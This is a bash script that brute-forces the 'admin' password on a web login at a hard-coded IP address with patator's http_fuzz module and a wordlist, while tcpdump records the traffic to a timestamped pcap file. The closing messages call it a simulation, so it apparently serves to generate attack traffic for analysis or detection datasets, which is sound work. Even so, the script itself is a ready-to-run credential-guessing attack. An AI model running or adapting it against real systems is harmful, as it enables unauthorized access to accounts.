#!/bin/bash

TARGET="http://205.174.165.68/login"
INTERFACE="eth0"
WORDLIST="passwords.txt"
USERNAME="admin"
PCAP_FILE="pcap/bruteforce_web_$(date +%Y%m%d_%H%M%S).pcap"

if [[ ! -f "$WORDLIST" ]]; then
  echo "[!] Password list not found: $WORDLIST"
  exit 1
fi

echo "[*] Starting tcpdump capture to $PCAP_FILE..."
sudo tcpdump -i "$INTERFACE" host 205.174.165.68 -w "$PCAP_FILE" &
TCPDUMP_PID=$!

patator http_fuzz \
  url="$TARGET" \
  method=POST \
  body="username=${USERNAME}&password=FILE0" \
  0="$WORDLIST" \
  -x ignore:code=404 \
  -t 10

echo "[*] Stopping tcpdump..."
kill "$TCPDUMP_PID"

echo "[✅] Brute-force simulation complete."
echo "[📂] Capture saved to: $PCAP_FILE"
